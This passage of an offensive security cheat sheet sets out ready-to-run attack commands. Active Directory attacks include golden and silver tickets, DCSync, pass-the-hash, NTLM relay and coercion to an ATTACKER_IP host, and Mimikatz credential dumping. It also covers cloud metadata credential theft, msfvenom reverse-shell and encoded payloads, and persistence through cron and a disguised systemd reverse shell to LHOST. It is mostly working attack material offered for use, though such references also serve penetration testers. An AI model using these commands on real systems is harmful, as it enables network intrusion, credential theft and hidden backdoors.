hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

### Golden Ticket
```bash
# Requires: krbtgt hash, domain SID, domain name
# Dump krbtgt hash via DCSync:
python3 secretsdump.py domain.local/admin:password@DC_IP -just-dc-user krbtgt

# Forge golden ticket:
python3 ticketer.py -domain-sid S-1-5-21-... -domain domain.local -nthash KRBGT_NT_HASH Administrator

# Use ticket:
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

### Silver Ticket
```bash
# Requires: service account hash, domain SID, target SPN
python3 ticketer.py -domain-sid S-1-5-21-... -domain domain.local -spn cifs/dc.domain.local -nthash SERVICE_NT_HASH Administrator

export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass Administrator@dc.domain.local
```

### DCSync
```bash
# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights
python3 secretsdump.py domain.local/user:password@DC_IP
python3 secretsdump.py domain.local/user:password@DC_IP -just-dc-ntlm
```

### Pass-the-Hash
```bash
# SMB:
python3 psexec.py -hashes :NT_HASH domain.local/Administrator@TARGET

# WMI:
python3 wmiexec.py -hashes :NT_HASH domain.local/Administrator@TARGET

# WinRM:
evil-winrm -i TARGET -u Administrator -H NT_HASH
```

### Overpass-the-Hash
```bash
# Get TGT with NTLM hash:
python3 getTGT.py domain.local/Administrator -hashes :NT_HASH

# Use TGT:
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass Administrator@dc.domain.local
```

### NTLM Relay
```bash
# Start relay:
sudo impacket-ntlmrelayx -t ldaps://DC_IP --delegate-access --escalate-user ATTACKER$

# Coerce authentication:
python3 petitpotam.py -d domain.local -u user -p password ATTACKER_IP TARGET_IP
python3 printerbug.py domain.local/user:password@TARGET_IP ATTACKER_IP
```

### Pass-the-Ticket
```bash
# Export tickets from compromised host:
mimikatz # sekurlsa::tickets /export

# Inject ticket:
mimikatz # kerberos::ptt ticket.kirbi
```

### Resource-Based Constrained Delegation (RBCD)
```bash
# Create computer account (if quota allows):
python3 addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ssw0rd123!' -dc-ip DC_IP domain.local/user:password

# Write RBCD:
python3 rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -dc-ip DC_IP domain.local/user:password -action write

# Get ST:
python3 getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/'EVIL$':'P@ssw0rd123!'

# Use ST:
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass Administrator@target.domain.local
```

### Shadow Credentials
```bash
python3 shadowcreds.py -target SRV01 -domain domain.local -dc-ip DC_IP domain.local/user:password -action add
python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass '' domain.local/SRV01\$ SRV01.ccache
```

### Bronze Bit (CVE-2020-17049) — Bypass Constrained Delegation
```bash
python3 getST.py -spn cifs/WEB.domain.local -impersonate Administrator domain.local/web_svc:password
python3 getST.py -spn cifs/DC.domain.local -impersonate Administrator domain.local/web_svc:password -force-forwardable
export KRB5CCNAME=Administrator.ccache
python3 secretsdump.py -k -no-pass dc.domain.local
```

### GenericAll Abuse
```bash
python3 bloodyAD.py -d domain.local -u user -p password --host DC_IP set password targetUser NewP@ssw0rd!
python3 bloodyAD.py -d domain.local -u user -p password --host DC_IP add shadowCredentials targetUser
```

### GenericWrite — Add SPN then Kerberoast
```bash
python3 targetedKerberoast.py -d domain.local -u user -p password --dc-ip DC_IP -v
python3 GetUserSPNs.py domain.local/user:password -request -target-user targetUser
```

### WriteDacl — Grant DCSync
```bash
python3 dacledit.py -target 'DC=domain,DC=local' -principal user -dc-ip DC_IP domain.local/Admin:Password -action write -rights DS-Replication-Get-Changes,DS-Replication-Get-Changes-All
python3 secretsdump.py domain.local/user:password@DC_IP -just-dc-ntlm
```

### SID History Injection (Golden Ticket variant)
```bash
python3 ticketer.py -domain-sid S-1-5-21-DOMAIN -domain domain.local -nthash KRBGT_NT_HASH -extra-sid S-1-5-21-OTHERDOMAIN-519 Administrator
```

### Enumeration Commands
```bash
# BloodHound collection:
bloodhound-python -c All -d domain.local -u user -p password -dc dc.domain.local -ns DC_IP

# LDAP anonymous bind:
ldapsearch -x -H ldap://DC_IP -D '' -w '' -b "DC=domain,DC=local"

# enum4linux-ng:
enum4linux-ng -A DC_IP

# Netexec:
netexec smb 10.0.0.0/24
netexec ldap 10.0.0.0/24 -u '' -p ''

# RPC enumeration:
rpcclient -U '' -N DC_IP
rpcclient $> enumdomusers; enumdomgroups

# Port scanning:
nmap -p 88,389,636,445,3268,3269,5985 DC_IP
```

### Credential Dumping (Windows / Mimikatz)
```
sekurlsa::logonpasswords           # Dump cleartext + hashes
lsadump::dcsync /user:krbtgt      # DCSync
lsadump::lsa /patch               # Dump LSA secrets
kerberos::list /export            # Export tickets
```

### LLMNR/NBT-NS Poisoning
```bash
sudo responder -I eth0 -dwv
mitm6 -d domain.local
sudo impacket-ntlmrelayx -t ldaps://DC_IP --delegate-access --escalate-user ATTACKER$
```

---

## CLOUD SSRF / METADATA

### AWS IMDSv1
```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/S3-Full-Access
curl http://169.254.169.254/latest/user-data/
curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

### AWS IMDSv2 (Token Required)
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/S3-Full-Access
```

### GCP
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### DigitalOcean
```bash
curl http://169.254.169.254/metadata/v1.json
```

### Kubernetes Service Account
```bash
# Via SSRF or compromised pod:
cat /run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/certificate
cat /run/secrets/kubernetes.io/serviceaccount/namespace

# Use token to access API:
curl -k -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

---

## NTLM COERCION

```bash
# PetitPotam:
python3 petitpotam.py -d domain.local -u user -p password ATTACKER_IP TARGET_IP

# PrinterBug:
python3 printerbug.py domain.local/user:password@TARGET_IP ATTACKER_IP

# DFSCoerce:
python3 dfscocerce.py -d domain.local -u user -p password ATTACKER_IP TARGET_IP

# ShadowCoerce (MS-FSRVP):
# Coercer framework:
python3 coercer.py -u user -p password -d domain.local -t TARGET_IP -l ATTACKER_IP
```

---

## PAYLOAD GENERATION (MSFVENOM)

### Linux Reverse Shells
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell64
msfvenom -p cmd/unix/reverse_bash LHOST=LHOST LPORT=LPORT -f raw
msfvenom -p cmd/unix/reverse_python LHOST=LHOST LPORT=LPORT -f raw
msfvenom -p cmd/unix/reverse_perl LHOST=LHOST LPORT=LPORT -f raw
msfvenom -p cmd/unix/reverse_php LHOST=LHOST LPORT=LPORT -f raw
```

### Windows Reverse Shells
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell64.exe
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f ps1
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f vba
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f asp
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f python
```

### Staged vs Stageless
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o staged.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o stageless.exe
```

### Encoded Payloads
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -e x86/shikata_ga_nai -i 5 -f elf -o encoded.elf
```

---

## USEFUL ONE-LINERS

### Start Listener
```bash
nc -lvnp LPORT
rlwrap nc -lvnp LPORT
socat file:`tty`,raw,echo=0 tcp-listen:LPORT
```

### Upgrade to Full TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c /bin/bash
# Ctrl+Z, then: stty raw -echo; fg; reset
export TERM=xterm
```

### File Transfer
```bash
# HTTP server:
python3 -m http.server 8080
python -m SimpleHTTPServer 8080

# Netcat transfer:
# Target: nc -lvnp LPORT > file
# LHOST: nc TARGET LPORT < file

# Wget / Curl:
wget http://LHOST:8080/file
curl -O http://LHOST:8080/file

# Base64:
base64 file | xclip  # or copy
echo BASE64_STRING | base64 -d > file

# SMB:
impacket-smbserver share /path/to/files
copy \\LHOST\share\file .
```

### Port Scanning from Target
```bash
# Bash:
for port in {1..65535}; do (echo >/dev/tcp/TARGET/$port) >/dev/null 2>&1 && echo "$port open"; done

# Netcat:
nc -zv TARGET 1-65535 2>&1 | grep succeeded

# /dev/tcp:
cat < /dev/tcp/TARGET/PORT && echo "PORT open"
```

### Persistence — Cron
```bash
echo "* * * * * bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'" | crontab -
(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'") | crontab -
```

### Persistence — SSH Key
```bash
mkdir -p ~/.ssh; echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
```

### Persistence — Systemd Service
```bash
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor; systemctl start backdoor
```

---

*Generated: 2026-06-06. Sources: PayloadsAllTheThings, HackTricks, PortSwigger Web Security Academy, H1 Writeups*
